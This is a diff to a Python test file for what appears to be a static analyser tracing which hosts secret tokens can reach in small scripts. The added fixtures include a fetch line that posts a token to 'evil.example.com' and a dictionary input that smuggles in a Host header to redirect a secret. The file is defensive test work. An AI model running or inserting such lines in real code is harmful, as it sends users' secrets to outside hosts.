@@ -1,5 +1,6 @@
 import sys
 import json
+import tracemalloc
 from collections.abc import Callable, Iterator
 from contextlib import AbstractContextManager, contextmanager, nullcontext
 from pathlib import Path
@@ -794,6 +795,13 @@ class TestSecretHosts(SimpleTestCase):
                 {"secret_headers": _origins("https://hooks.example.com", "https://evil.example.com")},
             ),
             (
+                "host_header_in_an_expanded_dictionary_input",
+                "fetch('https://hooks.example.com', {'headers': inputs.headers, 'body': inputs.token})",
+                _inputs(token="t", headers={"$$_extend_object": "{ {'Host': 'evil.example.com'} }"}),
+                {"token"},
+                {"token": UNBOUND},
+            ),
+            (
                 "secret_logged_through_a_lambda",
                 "let same := (v) -> v\nprint(same(inputs.salt))",
                 _inputs(salt="s"),
@@ -831,6 +839,7 @@ class TestSecretHosts(SimpleTestCase):
                 {},
                 nullcontext,
             ),
+            ("unsupported_code", "fetch('https://evil.example.com', {'body': inputs.token})()", {}, nullcontext),
             ("unparseable", "fetch(inputs.url, {", {}, nullcontext),
             (
                 "too_deep",
@@ -852,6 +861,20 @@ class TestSecretHosts(SimpleTestCase):
             analysis = analyze_secret_origins(hog, all_inputs, [], {"token"})
 
         assert analysis == SecretOriginsAnalysis(origins={"token": UNBOUND}, unanalyzable=reason)
+
+    def test_a_lambda_with_many_parameters_is_analyzed_in_bounded_memory(self) -> None:
+        count = 3000
+        params = ", ".join(f"p{n}" for n in range(count))
+        hog = f"let f := ({params}) -> p0\nf({', '.join(map(str, range(count)))})\n{SENDS_TOKEN_TO_URL}"
+
+        tracemalloc.start()
+        try:
+            analyze_secret_origins(hog, _inputs(url="https://hooks.example.com", token="t"), [], {"token"})
+            _, peak = tracemalloc.get_traced_memory()
+        finally:
+            tracemalloc.stop()
+
+        assert peak < 16 * 1024 * 1024
 
     def test_mapping_inputs_add_their_origins(self) -> None:
         mapping_inputs = [_inputs(url="https://mapped.example.com/a")]
